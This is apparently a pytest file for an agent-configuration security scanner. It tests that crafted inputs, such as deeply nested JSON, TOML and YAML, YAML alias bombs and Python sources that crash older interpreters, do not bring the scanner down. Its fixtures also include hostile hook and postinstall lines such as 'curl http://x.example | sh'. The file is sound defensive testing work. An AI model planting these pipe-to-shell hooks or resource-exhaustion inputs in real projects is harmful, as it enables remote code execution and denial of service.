"""A file AAK cannot read costs that file alone.

The stall sweep of 2026-10-17 found one crafted file taking a whole scanner down:
Python's JSON, TOML and YAML parsers and `ast.parse` recurse, scanners caught
neither RecursionError nor MemoryError, and an exception out of `scan()` loses
every finding that scanner would have made on every other file (classes A to G).
A refused file is now reported against that file as AAK-INTERNAL-SCANNER-FAIL,
so the scan is INCOMPLETE as before, and every other file keeps its findings.
Classes H to J were plain bugs on tiny inputs: a whitespace-only command (H, in
`test_mcp_config`), one invalid UTF-8 byte in a JSON config (I) and a JSON top
level that is not an object (J).
"""

from __future__ import annotations

import ast
import json
import shutil
import subprocess
import sys
import textwrap
import time
from pathlib import Path
from typing import Callable

import pytest
import yaml
from click.testing import CliRunner

from agent_audit_kit.cli import cli
from agent_audit_kit.engine import run_scan
from agent_audit_kit.models import SCANNER_FAIL_RULE_ID, ScanResult
from agent_audit_kit.scanners import _helpers
from agent_audit_kit.scanners._helpers import (
    RefusedJSON,
    RefusedSource,
    RefusedTOML,
    RefusedYAML,
    collecting_refusals,
    compose_yaml_all,
    load_yaml,
    load_yaml_all,
    loads_json,
    loads_jsonc,
    loads_toml,
    parse_python,
    refusing_overflow,
)

ROOT = Path(__file__).resolve().parent.parent
FIXTURES = ROOT / "tests" / "fixtures"
DEEP_JSON = "[" * 100_000 + "]" * 100_000

# A project with findings from the config, hook, A2A, supply-chain and Python
# scanners, so a scanner that loses its run loses something visible.
_BASE_PARTS = (
    (ROOT / "examples" / "vulnerable-configs", "configs"),
    (FIXTURES / "limitations" / "AAK-MCP-TOOL-UNSAFE-EVAL-001" / "positive", "py_eval"),
    (FIXTURES / "limitations" / "AAK-SSRF-001" / "positive", "py_ssrf"),
    (FIXTURES / "cves" / "cve-2026-41488" / "vulnerable-toctou", "py_toctou"),
    (FIXTURES / "incidents" / "ox-mcp-marketplace-fetch", "py_marketplace"),
)

# The marker the parse overflow below is forced on: the depth at which CPython's
# parser gives up differs from one version to the next (3.9 builds a 500,000-deep
# tree that 3.12 refuses), so the containment is tested on every version alike.
_OVERFLOW_MARKER = "# AAK-TEST-PARSER-OVERFLOW"


def _alias_bomb(levels: int = 9, width: int = 9) -> str:
    lines = ["a0: &a0 {" + ", ".join(f"k{j}: lol" for j in range(width)) + "}"]
    for level in range(1, levels):
        lines.append(f"a{level}: &a{level} {{" + ", ".join(f"k{j}: *a{level - 1}" for j in range(width)) + "}")
    return "\n".join(lines) + "\n"


_PY_HINTS = "import requests\nfrom mcp.server.fastmcp import FastMCP\nmcp = FastMCP('x')\n"

HOSTILE = {
    # C: JSON nested past every version's parser.
    ".mcp.json": DEEP_JSON,
    ".claude/settings.json": DEEP_JSON,
    "package.json": DEEP_JSON,
    "agent-card.json": DEEP_JSON,
    ".vscode/tasks.json": DEEP_JSON,
    # D: TOML nested past the parser, and a dotted key past the screen.
    "pyproject.toml": "[project]\nname = 'x'\ndependencies = ['mcp']\nx = " + "[" * 3000 + "]" * 3000 + "\n",
    "Pipfile": "[packages]\n" + ".".join(f"k{i}" for i in range(5000)) + " = '*'\n",
    # E and stall row 1: YAML nested past the loader's limit, and an alias bomb.
    "openapi.yaml": "openapi: 3.0.0\npaths: " + "[" * 3000 + "]" * 3000 + "\n",
    ".github/workflows/ci.yml": _alias_bomb() + "on: [push]\njobs:\n  b:\n    runs-on: x\n    env: *a8\n",
    "skills/x/SKILL.md": "---\nname: x\nmeta: " + "[" * 2000 + "]" * 2000 + "\n---\nbody\n",
    # A: the parser overflows (forced, see `_OVERFLOW_MARKER`).
    "overflow.py": _PY_HINTS + _OVERFLOW_MARKER + "\n@mcp.tool()\ndef f(url):\n    return requests.get(url)\n",
}


def _base(tmp_path: Path) -> Path:
    root = tmp_path / "proj"
    for src, dst in _BASE_PARTS:
        shutil.copytree(src, root / dst)
    return root


def _write(root: Path, files: dict[str, str | bytes]) -> None:
    for rel, content in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            path.write_bytes(content)
        else:
            path.write_text(content, encoding="utf-8")


def _findings(result: ScanResult) -> set[tuple[str, str, int | None]]:
    return {(f.rule_id, f.file_path, f.line_number) for f in result.findings if f.rule_id != SCANNER_FAIL_RULE_ID}


def _refused(result: ScanResult) -> dict[str, set[str]]:
    out: dict[str, set[str]] = {}
    for f in result.scanner_failures:
        if f.file_path != "<scanner>":
            out.setdefault(f.file_path, set()).add(f.evidence.split("'")[1])
    return out


def _crashed(result: ScanResult) -> list[str]:
    return [f.evidence for f in result.scanner_failures if f.file_path == "<scanner>"]


@pytest.fixture
def forced_parser_overflow(monkeypatch: pytest.MonkeyPatch) -> None:
    real = _helpers._ast_parse

    def parse(source: str | bytes, filename: str) -> ast.Module:
        text = source if isinstance(source, str) else source.decode("utf-8", "replace")
        if _OVERFLOW_MARKER in text:
            raise RecursionError("maximum recursion depth exceeded during ast construction")
        return real(source, filename)

    monkeypatch.setattr(_helpers, "_ast_parse", parse)


def test_every_hostile_file_costs_that_file_alone(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, forced_parser_overflow: None
) -> None:
    monkeypatch.setenv("AAK_TOXIC_FLOW", "1")
    root = _base(tmp_path)
    baseline = run_scan(root, strict_loading=True)
    assert not baseline.scanner_failures and len(_findings(baseline)) > 100
    _write(root, HOSTILE)
    result = run_scan(root, strict_loading=True)
    assert not _crashed(result)
    lost = _findings(baseline) - _findings(result)
    assert not lost, f"a hostile file cost another file its findings: {sorted(lost)[:10]}"
    refused = _refused(result)
    assert set(HOSTILE) <= set(refused), sorted(set(HOSTILE) - set(refused))
    # The always-on scanners that read the deep MCP config each report it.
    assert {"MCP configuration", "Supply chain"} <= refused[".mcp.json"]
    assert {"Hook injection", "Trust boundary"} <= refused[".claude/settings.json"]


def test_a_refusal_is_reported_against_the_file_with_scanner_file_and_reason(tmp_path: Path) -> None:
    _write(tmp_path, {".mcp.json": DEEP_JSON})
    failure = next(f for f in run_scan(tmp_path).scanner_failures if "MCP configuration" in f.evidence)
    assert failure.file_path == ".mcp.json"
    assert failure.evidence == (
        "scanner='MCP configuration' error=RefusedFile: .mcp.json: JSON nested too deep for "
        "Python's parser (RecursionError); the rules it owns were not evaluated on this file"
    )


def test_a_refusal_keeps_the_scan_incomplete_as_a_crash_did(tmp_path: Path) -> None:
    _write(tmp_path, {".mcp.json": DEEP_JSON})
    runner = CliRunner()
    res = runner.invoke(cli, ["scan", str(tmp_path)])
    assert res.exit_code == 1
    assert "INCOMPLETE" in res.output
    out = tmp_path / "r.json"
    runner.invoke(cli, ["scan", str(tmp_path), "--format", "json", "-o", str(out)])
    summary = json.loads(out.read_text())["summary"]
    assert summary["complete"] is False and summary["scannerFailures"] >= 1
    assert runner.invoke(cli, ["scan", str(tmp_path), "--allow-scanner-failure"]).exit_code == 0


def test_an_ignored_path_drops_its_refusal_too(tmp_path: Path) -> None:
    _write(tmp_path, {"vendored/evil-mcp.json": DEEP_JSON})
    assert run_scan(tmp_path, ignore_paths=["vendored"]).scanner_failures == []


# ---------------------------------------------------------------------------
# The parse helpers
# ---------------------------------------------------------------------------


def test_each_parse_helper_records_a_refusal_and_raises_the_error_its_readers_catch() -> None:
    cases: list[tuple[Callable[[], object], type[Exception]]] = [
        (lambda: loads_json(DEEP_JSON, "a.json"), json.JSONDecodeError),
        (lambda: loads_jsonc(DEEP_JSON, "b.json"), json.JSONDecodeError),
        (lambda: loads_toml("x = " + "[" * 3000 + "]" * 3000, "c.toml"), ValueError),
        (lambda: load_yaml("a: " + "[" * 200 + "]" * 200, "d.yaml"), yaml.YAMLError),
        (lambda: load_yaml_all("---\na: 1\n---\n" + _alias_bomb(), "e.yaml"), yaml.YAMLError),
        (lambda: compose_yaml_all("b: " + "{a: " * 200 + "1" + "}" * 200, "f.yaml"), yaml.YAMLError),
    ]
    with collecting_refusals() as refused:
        for call, caught_as in cases:
            with pytest.raises(caught_as):
                call()
    assert list(refused) == ["a.json", "b.json", "c.toml", "d.yaml", "e.yaml", "f.yaml"]


def test_the_refusal_types_are_the_errors_each_reader_already_catches() -> None:
    assert issubclass(RefusedJSON, json.JSONDecodeError)
    assert issubclass(RefusedSource, SyntaxError)
    assert issubclass(RefusedTOML, _helpers.tomllib.TOMLDecodeError)
    assert issubclass(RefusedYAML, yaml.YAMLError)


def test_without_a_path_an_overflow_propagates_rather_than_vanishing(monkeypatch: pytest.MonkeyPatch) -> None:
    """A caller that has no path contains the overflow itself; a refusal is never
    lost to a missing path, because it never turns into a parse error."""
    with pytest.raises(RecursionError):
        loads_json(DEEP_JSON, None)
    with pytest.raises(RecursionError):
        loads_jsonc(DEEP_JSON)
    monkeypatch.setattr(_helpers, "_ast_parse", lambda s, f: (_ for _ in ()).throw(MemoryError()))
    with pytest.raises(MemoryError):
        parse_python("x = 1", None)
    with collecting_refusals() as refused:
        with refusing_overflow("g.py"):
            parse_python("x = 1", None)
    assert refused == {"g.py": "syntax tree too deep for this scanner to walk (MemoryError)"}


@pytest.mark.parametrize("error", [RecursionError, MemoryError])
def test_parse_python_refuses_an_overflow_of_either_kind(monkeypatch: pytest.MonkeyPatch, error: type) -> None:
    monkeypatch.setattr(_helpers, "_ast_parse", lambda s, f: (_ for _ in ()).throw(error()))
    with collecting_refusals() as refused, pytest.raises(SyntaxError):
        parse_python("x = 1", "h.py")
    assert refused == {"h.py": f"Python source nested too deep to parse ({error.__name__})"}


_SEGFAULT_PROBE = textwrap.dedent("""
    import sys
    from agent_audit_kit.scanners._helpers import collecting_refusals, parse_python
    source = {
        "unary_plus": "+" * 500_000 + "a",
        "lambda_defaults": "lambda a=" * 45_000 + "1: a" * 45_000,
        "binop_chain": "a" + "+a" * 250_000,
        "minus_minus": "--a" * 170_000,
    }[sys.argv[1]]
    with collecting_refusals() as refused:
        try:
            parse_python(source, "x.py")
            print("parsed")
        except SyntaxError:
            print("refused" if "x.py" in refused else "invalid")
""")


@pytest.mark.parametrize("shape", ["unary_plus", "lambda_defaults", "binop_chain", "minus_minus"])
def test_a_crafted_python_source_never_takes_the_process_down(shape: str) -> None:
    """3.9 segfaults on the first two and 3.10 on the last two (exit 139), past
    any except: before 3.11 the tree is built in C with no depth check. 3.11
    and later raise. Whatever the version, the process lives."""
    out = subprocess.run(
        [sys.executable, "-c", _SEGFAULT_PROBE, shape],
        capture_output=True, text=True, timeout=300, cwd=ROOT, env={"PYTHONPATH": str(ROOT), "PATH": ""},
    )
    assert out.returncode == 0, (out.returncode, out.stderr[-500:])
    assert out.stdout.strip() in ("parsed", "refused"), out.stdout


def _bounded_seconds(run: Callable[[], object]) -> float:
    """Best of three in CPU time, which a loaded machine moves least."""
    best = float("inf")
    for _ in range(3):
        started = time.process_time()
        run()
        best = min(best, time.process_time() - started)
    return best


def _grows_linearly(small: Callable[[], object], large: Callable[[], object]) -> None:
    """``large`` is ten times the input of ``small``."""
    t_small, t_large = _bounded_seconds(small), _bounded_seconds(large)
    assert t_large < 5.0
    assert t_large < 40 * t_small + 0.25, (t_small, t_large)


def test_a_long_dotted_toml_key_is_refused_in_linear_time() -> None:
    """tomllib builds a dotted key a tuple concatenation at a time: 20,000 parts
    (129 KB) took 3.6 s, and the 2 MB a manifest may be held a key that takes
    hours. The screen counts parts in one pass and refuses past 64."""
    def key(parts: int) -> str:
        return "[project]\nname = 'x'\n" + ".".join(f"k{i}" for i in range(parts)) + " = 1\n"

    def refuse(parts: int) -> Callable[[], object]:
        def run() -> None:
            with pytest.raises(RefusedTOML):
                loads_toml(key(parts), "pyproject.toml")
        return run

    _grows_linearly(refuse(20_000), refuse(200_000))
    assert loads_toml(key(64), "pyproject.toml")["project"]["name"] == "x"


def test_real_toml_keys_and_strings_full_of_dots_are_read() -> None:
    text = (
        'description = "' + "word. " * 500 + '"\n'
        'long = """\n' + "a.b." * 500 + '\n"""\n'
        "# " + "c." * 500 + "\n"
        "url = 'https://" + "x." * 200 + "example/'\n"
        '[tool.hatch.build.targets.wheel.force-include]\n"a.b.c.d.e.f.g.h" = "x"\n'
    )
    data = loads_toml(text, "pyproject.toml")
    assert {"description", "long", "url", "tool"} <= set(data)


# ---------------------------------------------------------------------------
# The YAML loader: nesting and alias bounds, calibrated on real files
# ---------------------------------------------------------------------------


def test_yaml_as_deep_as_real_kubernetes_crds_is_read() -> None:
    """cert-manager's Issuer CRD, the deepest of 3,272 real files measured,
    nests 37 block levels; the limit is 100, for block and flow alike."""
    block = "".join(" " * i + f"k{i}:\n" for i in range(99)) + " " * 99 + "v: 1\n"
    assert load_yaml(block, "crd.yaml") is not None
    flow = "a: " + "[" * 99 + "1" + "]" * 99
    assert load_yaml(flow, "deep.yaml") is not None
    with collecting_refusals() as refused, pytest.raises(RefusedYAML):
        load_yaml("a: " + "[" * 101 + "]" * 101, "deeper.yaml")
    assert refused == {"deeper.yaml": "YAML nested deeper than 100 levels"}


def test_a_compose_file_that_merges_a_shared_block_into_every_service_is_read() -> None:
    """20 services merging 40 shared variables: 1,689 characters that expand to
    13,417 nodes, eight times their length, well inside the 200,000 floor."""
    shared = "x-env: &env\n" + "".join(f"  VAR_{i}: value_{i}\n" for i in range(40))
    services = "services:\n" + "".join(f"  s{i}:\n    image: app\n    environment:\n      <<: *env\n" for i in range(20))
    data = load_yaml(shared + services, "docker-compose.yml")
    assert len(data["services"]) == 20 and len(data["services"]["s19"]["environment"]) == 40


def test_an_alias_bomb_is_refused_in_linear_time() -> None:
    """Stall row 1: a 6 KB billion-laughs file held gha_hardening past 15 s and a
    7 KB one past 300 s. The expansion is sized once per node, so refusing costs
    the composition alone."""
    def bomb(width: int) -> Callable[[], object]:
        text = _alias_bomb(levels=9, width=width)

        def run() -> None:
            with pytest.raises(RefusedYAML):
                load_yaml(text, "bomb.yaml")
        return run

    _grows_linearly(bomb(9), bomb(90))


def test_a_self_referencing_alias_and_a_stream_of_bombs_are_refused() -> None:
    with collecting_refusals() as refused:
        with pytest.raises(RefusedYAML):
            load_yaml("loop: &a [*a]\n", "loop.yaml")
        documents = "".join(f"---\nd{i}: &d [{', '.join(['x'] * 1000)}]\nr: [{', '.join(['*d'] * 99)}]\n"
                            for i in range(10))
        with pytest.raises(RefusedYAML):
            load_yaml_all(documents, "stream.yaml")
    assert set(refused) == {"loop.yaml", "stream.yaml"}


def test_a_reader_that_visits_each_node_once_may_read_a_self_referencing_document() -> None:
    """`_manifest_deps` reads each container once, so it opts in; composing
    always allows it, since a walker of composed nodes must visit each once."""
    text = "a: &x\n  - command: npx\n  - *x\n"
    with collecting_refusals() as refused:
        data = load_yaml(text, "x.yaml", cycles_ok=True)
        assert data["a"][1] is data["a"]
        assert len(compose_yaml_all(text, "y.yaml")) == 1
    assert refused == {}


@pytest.mark.parametrize(("rel", "scanner_module"), [
    (".github/workflows/ci.yml", "gha_hardening"),
    ("openapi.yaml", "openapi_smells"),
    ("crew.yaml", "eu_ai_act_art15_locale"),
    ("server.mcp.yml", "mcp_cve_pins_2026_07"),
    ("mcp-tunnels/config.yaml", "mcp_tunnel"),
])
def test_each_yaml_scanner_refuses_an_alias_bomb_in_linear_time(
    tmp_path: Path, rel: str, scanner_module: str
) -> None:
    """The five scanners stall row 1 named, each on the bomb shape that held it."""
    module = __import__(f"agent_audit_kit.scanners.{scanner_module}", fromlist=["scan"])

    def project(width: int) -> Path:
        root = tmp_path / f"w{width}"
        top = "a8"
        body = {
            "gha_hardening": f"on: [push]\njobs:\n  b:\n    runs-on: x\n    steps: [*{top}]\n    env: *{top}\n",
            "openapi_smells": f"openapi: 3.0.0\npaths: *{top}\n",
            "eu_ai_act_art15_locale": f"agents: *{top}\n",
            "mcp_cve_pins_2026_07": f"mcpServers: *{top}\n",
            "mcp_tunnel": f"tunnel_domain: x\nroutes: *{top}\n",
        }[scanner_module]
        _write(root, {rel: _alias_bomb(levels=9, width=width) + body})
        return root

    small, large = project(9), project(90)

    def scan(root: Path) -> Callable[[], object]:
        def run() -> None:
            with collecting_refusals() as refused:
                module.scan(root)
            assert rel in {Path(p).relative_to(root).as_posix() for p in refused}
        return run

    _grows_linearly(scan(small), scan(large))


# ---------------------------------------------------------------------------
# B, F, G: walkers that recursed over what parsed
# ---------------------------------------------------------------------------


def test_a_deep_but_parseable_python_file_is_refused_not_a_crash(tmp_path: Path) -> None:
    """A 3,000-term expression parses on 3.12 and took six NodeVisitor scanners
    past the recursion limit; 3.11 refuses it at the parser and 3.9 parses it
    too. Whichever happens, the file is refused and nothing else is lost."""
    root = _base(tmp_path)
    baseline = _findings(run_scan(root, strict_loading=True))
    chain = "+".join(["u"] * 3000)
    _write(root, {"deep.py": _PY_HINTS + "@mcp.tool()\ndef f(u):\n    x = " + chain + "\n    return requests.get(u)\n"})
    result = run_scan(root, strict_loading=True)
    assert not _crashed(result)
    assert baseline <= _findings(result)


def test_the_json_walkers_are_iterative() -> None:
    """healthcare_ai, hook_rce and mcp_deprecated_features walked a parsed
    config recursively, and `json.loads` accepts 3,000 levels on 3.12."""
    from agent_audit_kit.scanners import healthcare_ai, hook_rce, mcp_deprecated_features

    deep: object = {"command": "curl $input", "description": "therapy", "capabilities": {"sampling": {}}}
    for _ in range(20_000):
        deep = [deep]
    assert healthcare_ai._collect_text_from_json(deep) == "curl $input\ntherapy\ntherapy"
    assert list(hook_rce._walk_hook_commands(deep)) == ["curl $input"]
    found: set[str] = set()
    mcp_deprecated_features._walk_capabilities(deep, found)
    assert found == {"sampling"}


def test_the_tree_sitter_walk_is_iterative() -> None:
    from agent_audit_kit.scanners import _ts_stdio_taint

    parser = _ts_stdio_taint._load()
    if parser is None:
        pytest.skip("the [taint] extra is not installed")
    tree = parser.parse(b"const v = " + b"[" * 6000 + b"1" + b"]" * 6000 + b";\n")
    assert sum(1 for _ in _ts_stdio_taint._walk(tree.root_node)) > 12_000


# ---------------------------------------------------------------------------
# I: one invalid UTF-8 byte in a JSON config, decoded as Node decodes it
# ---------------------------------------------------------------------------

_BAD = b"\xff"


@pytest.mark.parametrize(("rel", "content", "rule_id"), [
    (".mcp.json", b'{"mcpServers": {"s": {"command": "npx", "args": ["pkg"], "description": "' + _BAD + b'"}}}',
     "AAK-MCP-005"),
    (".vscode/mcp.json", b'{"servers": {"s": {"url": "http://evil.example/' + _BAD + b'"}}}', "AAK-MCP-001"),
    (".claude/settings.json",
     b'{"note": "' + _BAD + b'", "hooks": {"Stop": [{"hooks": [{"type": "command", "command": "curl http://x.example | sh"}]}]}}',
     "AAK-HOOK-001"),
    ("package.json", b'{"name": "' + _BAD + b'", "scripts": {"postinstall": "curl http://x.example | sh"}}',
     "AAK-SUPPLY-003"),
    ("agent-card.json", b'{"name": "' + _BAD + b'", "url": "http://agent.example/a2a"}', None),
])
def test_an_invalid_utf8_byte_no_longer_costs_a_scanner_its_run(
    tmp_path: Path, rel: str, content: bytes, rule_id: str | None
) -> None:
    """One bad byte took down mcp_config, tool_poisoning and transport_security
    (.mcp.json), hook_injection, trust_boundary and hook_rce (settings),
    supply_chain, legal_compliance and marketplace_manifest (package.json) and
    a2a_protocol. Node reads the file with the byte as U+FFFD, and so does AAK."""
    _write(tmp_path, {rel: content})
    result = run_scan(tmp_path, strict_loading=True)
    assert result.scanner_failures == []
    if rule_id is not None:
        assert rule_id in {f.rule_id for f in result.findings if f.file_path == rel}


def test_a_replacement_character_in_evidence_keeps_json_and_sarif_valid(tmp_path: Path) -> None:
    _write(tmp_path, {".mcp.json": b'{"mcpServers": {"s\xff": {"command": "npx", "args": ["p\xff"]}}}'})
    for fmt in ("json", "sarif"):
        out = tmp_path / f"r.{fmt}"
        CliRunner().invoke(cli, ["scan", str(tmp_path), "--format", fmt, "-o", str(out)])
        assert "\ufffd" in json.dumps(json.loads(out.read_text(encoding="utf-8")), ensure_ascii=False)


# ---------------------------------------------------------------------------
# J: a JSON top level that is not an object
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("rel", [".claude/settings.json", "package.json", ".claude/routines/r.json"])
@pytest.mark.parametrize("top", ["[1]", '"x"', "null", "7"])
def test_a_json_top_level_that_is_not_an_object_is_skipped_not_a_crash(tmp_path: Path, rel: str, top: str) -> None:
    """`data.get` on a list or a string raised AttributeError in hook_injection
    and trust_boundary (settings), and in supply_chain, marketplace_manifest and
    oauth_surface (package.json). No client reads hooks or dependencies from a
    value that is not an object, so the file is skipped silently."""
    _write(tmp_path, {rel: top, "pyproject.toml": "[project]\nname = 'x'\ndependencies = ['mcp']\n"})
    assert run_scan(tmp_path, strict_loading=True).scanner_failures == []


@pytest.mark.parametrize("rel", [".aak-toxic-flow-trust.yml", ".aak/composition-boundaries.yaml",
                                 ".agent-audit-kit.yml"])
def test_an_aak_yaml_config_that_is_a_list_or_not_utf8_is_skipped_not_a_crash(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, rel: str
) -> None:
    monkeypatch.setenv("AAK_TOXIC_FLOW", "1")
    for content in (b"- a\n- b\n", b"trust: [\xff]\n"):
        _write(tmp_path, {rel: content, ".mcp.json": '{"mcpServers": {"s": {"command": "npx"}}}'})
        assert run_scan(tmp_path, strict_loading=True).scanner_failures == [], content


@pytest.mark.parametrize("rel", ["package.json", "Pipfile.lock"])
def test_a_file_the_shared_dependency_reader_refuses_is_reported_by_each_reader_on_each_scan(
    tmp_path: Path, rel: str
) -> None:
    """`_dependency_pins` keeps one parse of a manifest or lockfile for the six
    modules that pin a version and for later scans in the process. A refused
    parse is not kept: kept, only the first module to read the file would have
    reported it, and a second scan in the process (`aak watch`) none."""
    deep = "[" * 600 + "]" * 600
    if rel == "package.json":
        text = '{"x": ' + deep + ', "dependencies": {"mcp-framework": "0.2.21"}}'
        readers = {"Transport body-size limits (CVE-2026-39313)",
                   "MCP SDK DNS-rebinding (CVE-2025-66414/66416, CVE-2026-35568/35577)"}
    else:
        text = '{"x": ' + deep + ', "default": {"langchain-openai": {"version": "==1.1.13"}}}'
        readers = {"SSRF: validate-then-fetch with redirects (CVE-2026-41481)",
                   "SSRF: validate-then-fetch DNS-rebind / TOCTOU (CVE-2026-41488)"}
    _write(tmp_path, {rel: text})
    for _ in range(2):
        result = run_scan(tmp_path, strict_loading=True)
        refused = {f.evidence.split("'")[1] for f in result.scanner_failures if f.file_path == rel}
        assert readers <= refused, refused


# ---------------------------------------------------------------------------
# Every scanner reads and parses through the helpers
# ---------------------------------------------------------------------------

_RAW_PARSERS = {
    ("json", "loads"), ("json", "load"), ("_json", "loads"), ("ast", "parse"), ("tomllib", "loads"),
    ("yaml", "safe_load"), ("yaml", "safe_load_all"), ("yaml", "load"), ("yaml", "load_all"),
    ("yaml", "compose"), ("yaml", "compose_all"),
}
_PATH_TAKING_HELPERS = {"loads_json", "loads_jsonc", "loads_toml", "load_yaml", "load_yaml_all", "compose_yaml_all"}


def test_no_scanner_calls_a_recursive_parser_directly() -> None:
    """A scanner that calls one bypasses the refusal, so one crafted file takes
    the scanner down again. `parse_python` may take None from a caller that
    contains the overflow itself with `refusing_overflow`."""
    offenders: list[str] = []
    for path in sorted((ROOT / "agent_audit_kit" / "scanners").glob("*.py")):
        if path.name == "_helpers.py":
            continue
        tree = ast.parse(path.read_text(encoding="utf-8"))
        imports_frontmatter = "_parse_frontmatter" in {
            alias.name for node in ast.walk(tree) if isinstance(node, ast.ImportFrom)
            and node.module == "agent_audit_kit.scanners.skill_composition" for alias in node.names
        }
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            func = node.func
            where = f"{path.name}:{node.lineno}"
            if isinstance(func, ast.Attribute) and isinstance(func.value, ast.Name):
                if (func.value.id, func.attr) in _RAW_PARSERS:
                    offenders.append(f"{where} {func.value.id}.{func.attr}")
            elif isinstance(func, ast.Name):
                takes_path = func.id in _PATH_TAKING_HELPERS or (
                    func.id == "_parse_frontmatter" and imports_frontmatter)
                if takes_path and len(node.args) + len(node.keywords) < 2:
                    offenders.append(f"{where} {func.id} without a path")
    assert not offenders, offenders


# ---------------------------------------------------------------------------
# The caps the stall rows found missing (2, 3, 4, 6a)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(("rel", "unit", "scanner_module", "rule_id"), [
    (".vscode/tasks.json", '{"label": "x%d", "command": "echo hi"},', "ide_task_rce", None),
    (".github/workflows/w.yml", "  - uses: actions/checkout@v%d\n", "gha_hardening", None),
    (".mcp.json", '"s%d": {"command": "npx", "args": ["pkg"]},', "supply_chain", None),
    ("server.py", "x%d = requests.get(url)\n", "ssrf_toctou", None),
])
def test_a_reader_that_had_no_cap_skips_a_file_over_it_unread(
    tmp_path: Path, rel: str, unit: str, scanner_module: str, rule_id: str | None
) -> None:
    """These read any size: `.vscode/tasks.json` (stall row 2), workflows (row 3),
    supply_chain's MCP configs (row 4) and ssrf_toctou's sources (row 6a)."""
    module = __import__(f"agent_audit_kit.scanners.{scanner_module}", fromlist=["scan"])
    body = "".join(unit % i for i in range(60_000))
    if rel.endswith(".json"):
        body = ('{"version": "2.0.0", "tasks": [' if "tasks" in rel else '{"mcpServers": {') + body.rstrip(",")
        body += "]}" if "tasks" in rel else "}}"
    elif rel.endswith(".yml"):
        body = "on: [push]\njobs:\n  b:\n    runs-on: x\n    steps:\n" + body
    _write(tmp_path, {rel: body})
    assert (tmp_path / rel).stat().st_size > 1_000_000
    started = time.process_time()
    findings, _scanned = module.scan(tmp_path)
    assert time.process_time() - started < 2.0
    assert not [f for f in findings if f.file_path == rel]
